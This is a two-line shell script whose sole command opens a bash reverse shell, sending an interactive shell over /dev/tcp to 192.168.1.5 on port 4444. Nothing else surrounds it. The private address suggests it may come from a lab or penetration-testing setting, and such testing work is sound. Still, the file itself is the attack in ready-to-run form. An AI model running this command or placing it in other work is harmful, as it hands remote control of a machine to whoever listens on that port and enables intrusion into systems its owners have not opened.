#!/bin/sh
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
